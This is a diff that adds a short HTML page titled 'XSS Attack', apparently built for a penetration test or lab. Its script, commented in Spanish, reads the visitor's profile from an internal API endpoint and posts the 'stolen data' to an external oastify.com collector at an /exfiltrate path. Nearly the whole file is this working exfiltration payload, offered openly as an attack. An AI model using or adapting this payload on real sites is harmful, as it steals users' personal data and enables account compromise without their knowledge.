@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS</title>
+</head>
+<body>
+  <h1>XSS Attack</h1>
+  <p id="status">XSS metadata...</p>
+
+  <script>
+// 1. Obtener los datos del perfil desde la API interna
+fetch('/api/v1/user/profile')
+  .then(response => response.json())
+  .then(data => {
+    // 2. Enviar los datos robados al servidor del atacante
+    fetch('https://egypsaqwvpkx3vq7rvrlfhz4wv2mqmeb.oastify.com/exfiltrate', {
+      method: 'POST',
+      body: JSON.stringify(data)
+    });
+  });
+  </script>
+
+  </body>
+</html>
